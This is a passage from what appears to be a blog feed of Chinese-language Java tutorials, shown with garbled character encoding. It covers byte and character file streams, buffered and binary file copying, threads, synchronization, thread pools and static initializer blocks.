class="line">                <span class="comment">// å°†å­—èŠ‚è½¬æ¢ä¸ºå­—ç¬¦æ˜¾ç¤º</span></span><br><span class="line">                System.out.print((<span class="type">char</span>) byteData);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è¯»å–æ–‡ä»¶å‡ºé”™: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 3. å…³é—­æµ</span></span><br><span class="line">            <span class="keyword">if</span> (fis != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fis.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;å…³é—­æ–‡ä»¶å‡ºé”™: &quot;</span> + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FileOutputStream</code>å¯ç”¨äºå†™å…¥æ–‡ä»¶ï¼Œç»§æ‰¿äº<code>OutputStream</code><br><code>void write(int c)</code>å†™å…¥æ•´æ•°<br><code>void write(byte[] buf)</code>å†™å…¥å­—èŠ‚æ•°ç»„<br><code>void write(byte[] b,int off,int len)</code>å‘è¾“å…¥æµä¸­å†™å…¥æœ€å¤š len ä¸ªå­—èŠ‚çš„æ•°æ®åˆ°å­—èŠ‚æ•°ç»„ b ä¸­ï¼Œä»æ•°ç»„çš„åç§»ä½ç½® off å¼€å§‹å­˜å‚¨<br><code>void close()</code>å…³é—­æµ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleFileWriter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. åˆ›å»ºæ–‡ä»¶è¾“å‡ºæµ</span></span><br><span class="line">            <span class="comment">// å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ä¼šè‡ªåŠ¨åˆ›å»ºï¼Œå¦‚æœå­˜åœ¨ä¼šè¦†ç›–</span></span><br><span class="line">            fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. å†™å…¥å­—ç¬¦ä¸²ï¼ˆéœ€è¦è½¬æ¢ä¸ºå­—èŠ‚ï¼‰</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;Hello, World!\n&quot;</span>;</span><br><span class="line">            <span class="type">byte</span>[] bytes = text.getBytes();  <span class="comment">// å­—ç¬¦ä¸²è½¬å­—èŠ‚æ•°ç»„</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 3. å†™å…¥æ–‡ä»¶</span></span><br><span class="line">            fos.write(bytes);</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;æ–‡ä»¶å†™å…¥æˆåŠŸï¼&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å†™å…¥æ–‡ä»¶å‡ºé”™: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 4. å…³é—­æµ</span></span><br><span class="line">            <span class="keyword">if</span> (fos != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;å…³é—­æ–‡ä»¶å‡ºé”™: &quot;</span> + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦æµ"><a href="#å­—ç¬¦æµ" class="headerlink" title="å­—ç¬¦æµ"></a>å­—ç¬¦æµ</h3><p>å­—ç¬¦æµä»¥å­—ç¬¦ä¸ºå•ä½è¿›è¡Œè¯»å–å†™å…¥æ“ä½œï¼ŒåŸºæœ¬é€»è¾‘ä¸å­—èŠ‚æµæ— å¼‚ </p><p><code>FileReader</code>çš„çˆ¶ç±»æ˜¯<code>InputStreamReader</code>ï¼Œ<code>InputStreamReader</code>çš„çˆ¶ç±»æ˜¯<code>Reader</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleFileReader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FileReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. åˆ›å»ºFileReader</span></span><br><span class="line">            reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. é€ä¸ªå­—ç¬¦è¯»å–</span></span><br><span class="line">            <span class="type">int</span> charData;</span><br><span class="line">            System.out.println(<span class="string">&quot;æ–‡ä»¶å†…å®¹ï¼š&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> ((charData = reader.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.print((<span class="type">char</span>) charData);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è¯»å–æ–‡ä»¶å‡ºé”™: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 3. å…³é—­æµ</span></span><br><span class="line">            <span class="keyword">if</span> (reader != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;å…³é—­æ–‡ä»¶å‡ºé”™: &quot;</span> + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FileWriter</code>çš„çˆ¶ç±»æ˜¯<code>OutputStreamWriter</code>ï¼Œ<code>OutputStreamWriter</code>çš„çˆ¶ç±»æ˜¯<code>Writer</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleFileWriter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. åˆ›å»ºFileWriter</span></span><br><span class="line">            <span class="comment">// é»˜è®¤è¦†ç›–æ¨¡å¼ï¼Œæ–‡ä»¶ä¸å­˜åœ¨ä¼šè‡ªåŠ¨åˆ›å»º</span></span><br><span class="line">            writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. å†™å…¥å†…å®¹</span></span><br><span class="line">            writer.write(<span class="string">&quot;ä½ å¥½ï¼Œä¸–ç•Œï¼\n&quot;</span>);</span><br><span class="line">            writer.write(<span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line">            writer.write(<span class="string">&quot;è¿™æ˜¯ç¬¬ä¸‰è¡Œã€‚\n&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;æ–‡ä»¶å†™å…¥æˆåŠŸï¼&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å†™å…¥æ–‡ä»¶å‡ºé”™: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 3. å…³é—­æµ</span></span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;å…³é—­æ–‡ä»¶å‡ºé”™: &quot;</span> + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¼“å†²æµ"><a href="#ç¼“å†²æµ" class="headerlink" title="ç¼“å†²æµ"></a>ç¼“å†²æµ</h3><p>ä½¿ç”¨<code>BufferedReader</code>è¯»å–æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleBufferedReader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;test.txt&quot;</span>))) &#123;</span><br><span class="line">            </span><br><span class="line">            String line;</span><br><span class="line">            <span class="type">int</span> <span class="variable">lineNumber</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;æ–‡ä»¶å†…å®¹ï¼š&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// é€è¡Œè¯»å–ï¼Œç›´åˆ°æ–‡ä»¶ç»“æŸ</span></span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(lineNumber + <span class="string">&quot;: &quot;</span> + line);</span><br><span class="line">                lineNumber++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;æ€»å…± &quot;</span> + (lineNumber - <span class="number">1</span>) + <span class="string">&quot; è¡Œ&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;è¯»å–æ–‡ä»¶å‡ºé”™: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<code>BufferedWriter</code>å†™å…¥æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleBufferedWriter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>))) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// å†™å…¥å†…å®¹</span></span><br><span class="line">            writer.write(<span class="string">&quot;ä½ å¥½ï¼Œä¸–ç•Œï¼&quot;</span>);</span><br><span class="line">            writer.newLine();  <span class="comment">// æ¢è¡Œ</span></span><br><span class="line">            writer.write(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">            writer.newLine();</span><br><span class="line">            writer.write(<span class="string">&quot;è¿™æ˜¯ç¬¬ä¸‰è¡Œã€‚&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;æ–‡ä»¶å†™å…¥æˆåŠŸï¼&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;å†™å…¥æ–‡ä»¶å‡ºé”™: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è¯»å†™äºŒè¿›åˆ¶æ–‡ä»¶"><a href="#è¯»å†™äºŒè¿›åˆ¶æ–‡ä»¶" class="headerlink" title="è¯»å†™äºŒè¿›åˆ¶æ–‡ä»¶"></a>è¯»å†™äºŒè¿›åˆ¶æ–‡ä»¶</h3><p>ä¸Šé¢è¯´çš„é›†å‡ ç§æµåªèƒ½æ“ä½œæ–‡æœ¬ï¼Œä½¿ç”¨äºŒè¿›åˆ¶æµå¯ä»¥è®©æˆ‘ä»¬å®ç°å¯¹æ›´å¤šæ–‡ä»¶çš„è¯»å†™</p><p><code>DataInputStream</code>ç±»ï¼Œæ˜¯<code>FileInputStream</code>çš„å­ç±»ï¼Œä¸<code>FileInputStream</code>ç±»ç»“åˆä½¿ç”¨è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶</p><p><code>DataOutputStream</code>ç±»ï¼Œæ˜¯<code>FileOutputStream</code>çš„å­ç±»ï¼Œä¸<code>FileOutputStream</code>ç±»ç»“åˆä½¿ç”¨å†™äºŒè¿›åˆ¶æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinaryFileCopy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// æºæ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¦‚å›¾ç‰‡ï¼‰</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\Java\\è¯»ä¹¦\\1.png&quot;</span>);</span><br><span class="line">            <span class="comment">// ç›®æ ‡æ–‡ä»¶</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Java\\è¯»ä¹¦\\2.png&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            dis = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(fis);</span><br><span class="line">            dos = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(fos);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// è¾¹è¯»å–æ•°æ®ï¼Œè¾¹å†™å…¥æ•°æ®</span></span><br><span class="line">            <span class="type">int</span> data; <span class="comment">// å­˜å‚¨è¯»å–çš„å­—èŠ‚ï¼ˆ0-255ï¼‰æˆ–-1ï¼ˆæ–‡ä»¶ç»“æŸï¼‰</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> ((data = dis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// å†™å…¥è¯»å–çš„å­—èŠ‚</span></span><br><span class="line">                dos.write(data);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;æ–‡ä»¶å¤åˆ¶å®Œæˆï¼&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;æ–‡ä»¶æœªæ‰¾åˆ°: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;IOé”™è¯¯: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// å…³é—­æµï¼ˆå®é™…ä»£ç ä¸­åº”è¯¥åœ¨è¿™é‡Œï¼‰</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <br/><h2 id="å¤šçº¿ç¨‹"><a href="#å¤šçº¿ç¨‹" class="headerlink" title="å¤šçº¿ç¨‹"></a>å¤šçº¿ç¨‹</h2><p>æ‰€è°“çš„å¤šçº¿ç¨‹æ˜¯å¤šä¸ªçº¿ç¨‹äº¤æ›¿å ç”¨CPUèµ„æºï¼Œè€ŒéçœŸæ­£çš„å¹¶è¡Œæ‰§è¡Œ-</p><p>åœ¨Javaä¸­åˆ›å»ºçº¿ç¨‹ï¼šç»§æ‰¿ <code>java.lang.Thread</code> ç±»æˆ–è€…å®ç° <code>java.lang.Runnable</code> æ¥å£</p><blockquote><p>åœ¨é€šè¿‡å®ç° <code>java.lang.Runnable</code> æ¥å£åˆ›å»ºçº¿ç¨‹æ—¶ï¼Œæˆ‘ä»¬å®šä¹‰çš„çº¿ç¨‹ç±»ä¸­å¹¶æ²¡æœ‰<code>start()</code>æ–¹æ³•ï¼Œè¿˜éœ€è¦è°ƒç”¨<code>Thread</code>ç±»ä¸­çš„å¸¦å‚æ„é€ æ–¹æ³•å°†<code>Runnable</code> æ¥å£çš„å®ç°ç±»åŒ…è£…æˆä¸€ä¸ª<code>Thread</code>å¯¹è±¡æ‰å¯ä»¥è¿›è¡Œè°ƒç”¨<code>start()</code>æ–¹æ³•</p></blockquote><h3 id="çº¿ç¨‹åŒæ­¥"><a href="#çº¿ç¨‹åŒæ­¥" class="headerlink" title="çº¿ç¨‹åŒæ­¥"></a>çº¿ç¨‹åŒæ­¥</h3><p>å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªèµ„æºæ—¶ï¼Œä¼šå¼•å‘æ•°æ®ä¸å®‰å…¨çš„é—®é¢˜</p><p><code>synchronized</code>ä¿®é¥°ç¬¦ï¼šå¯¹äºè¢«ä¿®é¥°çš„æ–¹æ³•ï¼Œ<code>synchronized</code>å°±æ˜¯ä¸ºå½“å‰çº¿ç¨‹å£°æ˜ä¸€ä¸ªé”ï¼Œå°†è¢«ä¿®é¥°çš„æ–¹æ³•è§†ä¸ºä¸€ä¸ªæ•´ä½“ã€‚å¯¹äºä½¿ç”¨<code>synchronized</code>å…³é”®å­—ä¿®é¥°çš„ä»£ç å—ï¼Œç›¸æ¯”<code>synchronized</code>åŒæ­¥çš„èŒƒå›´æ›´å°ï¼Œä»…åŒæ­¥è¢«ä¿®é¥°çš„ä»£ç å—</p><table><thead><tr><th>ç±»å‹åç§°</th><th>çº¿ç¨‹æ˜¯å¦å®‰å…¨</th><th>æ•ˆç‡æ¯”è¾ƒ</th><th>é€‚åˆåœºæ™¯</th></tr></thead><tbody><tr><td><code>Vector</code></td><td>æ˜¯</td><td>ä½</td><td>å¤šçº¿ç¨‹å¹¶å‘å…±äº«èµ„æº</td></tr><tr><td><code>ArrayList</code></td><td>å¦</td><td>é«˜</td><td>å•çº¿ç¨‹</td></tr><tr><td><code>Hashtable</code></td><td>æ˜¯</td><td>ä½</td><td>å¤šçº¿ç¨‹å¹¶å‘å…±äº«èµ„æº</td></tr><tr><td><code>HashMap</code></td><td>å¦</td><td>é«˜</td><td>å•çº¿ç¨‹</td></tr></tbody></table><h3 id="çº¿ç¨‹æ± "><a href="#çº¿ç¨‹æ± " class="headerlink" title="çº¿ç¨‹æ± "></a>çº¿ç¨‹æ± </h3><p>Javaçº¿ç¨‹æ± æ˜¯ä¸€ç§å®ç°å¤šçº¿ç¨‹ç¼–ç¨‹çš„æœºåˆ¶ï¼Œå®ƒå¯ä»¥å¸®åŠ©æˆ‘ä»¬æœ‰æ•ˆåœ°ç®¡ç†å’Œè°ƒåº¦å¤šä¸ªçº¿ç¨‹ï¼Œä»è€Œæé«˜ç¨‹åºçš„æ€§èƒ½å’Œæ•ˆç‡</p><blockquote><p>Javaçº¿ç¨‹æ± çš„ä½¿ç”¨æ­¥éª¤ï¼š</p><p>åˆ›å»ºçº¿ç¨‹æ± ï¼šä½¿ç”¨ <code>java.util.concurrent.Executors</code> ç±»ä¸­çš„é™æ€æ–¹æ³•åˆ›å»ºçº¿ç¨‹æ± </p><p>åˆ›å»ºä»»åŠ¡ï¼šåˆ›å»ºå®ç° <code>Runnable</code> æˆ– <code>Callable</code> æ¥å£çš„ä»»åŠ¡</p><p>æäº¤ä»»åŠ¡ï¼šä½¿ç”¨çº¿ç¨‹æ± çš„ <code>submit()</code> æ–¹æ³•æäº¤ä»»åŠ¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ <code>execute()</code> æ–¹æ³•æäº¤ <code>Runnable</code> ä»»åŠ¡</p><p>å…³é—­çº¿ç¨‹æ± ï¼šä½¿ç”¨çº¿ç¨‹æ± çš„ <code>shutdown()</code> æˆ– <code>shutdownNow()</code> æ–¹æ³•å…³é—­çº¿ç¨‹æ± </p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutorService;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.Executors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleThreadPool</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 1. åˆ›å»ºçº¿ç¨‹æ± ï¼ˆ2ä¸ªçº¿ç¨‹ï¼‰</span></span><br><span class="line">        <span class="type">ExecutorService</span> <span class="variable">pool</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 2. æäº¤5ä¸ªä»»åŠ¡</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">taskId</span> <span class="operator">=</span> i;</span><br><span class="line">            pool.execute(() -&gt; &#123;</span><br><span class="line">                <span class="comment">// ç®€å•è¾“å‡ºï¼šå“ªä¸ªçº¿ç¨‹æ‰§è¡Œå“ªä¸ªä»»åŠ¡</span></span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot; -&gt; Task &quot;</span> + taskId);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3. å…³é—­çº¿ç¨‹æ± </span></span><br><span class="line">        pool.shutdown();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <br/>]]></content>
      
      
      <categories>
          
          <category> é›¶ç¢ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaé¢å‘å¯¹è±¡åŸºç¡€è¯æ¡</title>
      <link href="/2025/12/03/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E8%AF%8D%E6%9D%A1/"/>
      <url>/2025/12/03/Java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80%E8%AF%8D%E6%9D%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaé¢å‘å¯¹è±¡åŸºç¡€è¯æ¡"><a href="#Javaé¢å‘å¯¹è±¡åŸºç¡€è¯æ¡" class="headerlink" title="Javaé¢å‘å¯¹è±¡åŸºç¡€è¯æ¡"></a>Javaé¢å‘å¯¹è±¡åŸºç¡€è¯æ¡</h1><br/><h2 id="staticä»£ç å—"><a href="#staticä»£ç å—" class="headerlink" title="staticä»£ç å—"></a>staticä»£ç å—</h2><p>åœ¨ä¸€ä¸ªç±»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰è‹¥å¹²ä¸ªstaticä»£ç å—</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticTest</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> num=<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        num+=<span class="number">100</span>;</span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        num+=<span class="number">500</span>;</span><br><span class="line">        System.out.println(num);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>JVMåŠ è½½ç±»æ—¶ï¼Œä¼šåŠ è½½é™æ€ä»£ç å—ï¼Œå¦‚æœ‰å¤šä¸ªåˆ™æŒ‰é¡ºåºåŠ è½½ï¼Œæ¯ä¸ªä»£ç å—åªä¼šè¢«æ‰§è¡Œä¸€æ¬¡ï¼Œé™æ€ä»£ç å—çš„åŠ è½½å’Œå¯¹è±¡çš„åˆ›å»ºæ²¡æœ‰å…³ç³»</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åœ¨mainå‡½æ•°ä¸­</span></span><br><span class="line">StaticTest st1=<span class="keyword">new</span> <span class="title class_">StaticTest</span>();</span><br><span class="line">StaticTest st1=<span class="keyword">new</span> <span class="title class_">StaticTest</span>(); <span class="comment">//ä¸ä¼šæœ‰è¾“å‡ºï¼Œç±»é€šå¸¸åªä¼šè¢«åŠ è½½ä¸€æ¬¡</span></span><br><span class="line">System.out.println(num); </span><br><span class="line"><span class="comment">//è¾“å‡º:</span></span><br><span class="line"><span class="comment">//200</span></span><br><span class="line"><span class="comment">//700</span></span><br><span class="line"><span class="comment">//700</span></span><br></pre></td></tr></table></figure><p> <strong>ä¸»åŠ¨ä½¿ç”¨ç±»çš„7ç§æƒ…å†µ(ä¼šè§¦å‘ç±»åŠ è½½å’Œé™æ€ä»£ç å—)</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TriggerConditions</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;=== å„ç§è§¦å‘æƒ…å†µ ===&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. åˆ›å»ºç±»çš„å®ä¾‹</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">TriggerDemo</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. è®¿é—®ç±»çš„é™æ€å˜é‡ï¼ˆéå¸¸é‡ï¼‰</span></span><br><span class="line">        System.out.println(TriggerDemo.staticField);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. è°ƒç”¨ç±»çš„é™æ€æ–¹æ³•</span></span><br><span class="line">        TriggerDemo.staticMethod();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. ä½¿ç”¨åå°„</span></span><br><span class="line">        Class.forName(<span class="string">&quot;TriggerDemo&quot;</span>);</span><br><span 